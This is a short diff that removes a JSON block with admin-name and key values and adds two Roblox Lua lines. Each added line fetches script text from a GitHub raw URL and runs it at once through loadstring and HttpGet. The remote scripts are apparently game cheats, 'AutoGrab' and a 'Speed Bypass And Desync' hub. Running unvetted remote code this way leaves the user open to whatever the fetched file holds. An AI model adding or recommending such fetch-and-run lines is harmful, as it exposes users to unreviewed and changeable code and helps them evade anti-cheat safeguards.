@@ -1,5 +1,2 @@
-{
-  "admin": "adam_saadi8737",
-  "key": "JOO2025",
-  "mode": "system"
-}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pro628713-arch/Test-nine-hub/refs/heads/main/AutoGrabv2%20(1).txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pro628713-arch/Test-nine-hub/refs/heads/main/Irish%20Hub%20Speed%20Bypass%20And%20Desync.txt"))()
